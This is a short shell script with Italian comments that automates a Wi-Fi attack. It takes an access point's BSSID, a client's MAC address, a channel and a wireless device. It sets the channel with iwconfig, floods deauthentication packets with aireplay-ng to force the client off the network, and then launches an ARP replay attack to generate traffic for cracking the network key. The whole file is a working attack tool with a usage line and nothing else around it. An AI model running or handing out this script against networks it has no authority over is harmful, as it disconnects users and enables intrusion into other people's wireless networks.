#!/bin/sh

printf "UTILIZZO: <BSSID> <STATION> <numOfPackets> <channel> <device> \n\n\n"

BSSID=$1
STATION=$2
numOfPackets=$3
channel=$4
device=$5

# Fase 0 - selezione canale 
iwconfig $device channel $channel

# Fase 1 - Deauth
aireplay-ng --deauth $numOfPackets -a $BSSID -c $STATION $device


# Fase 2 - replay
aireplay-ng --arpreplay -b $BSSID -h $STATION $device
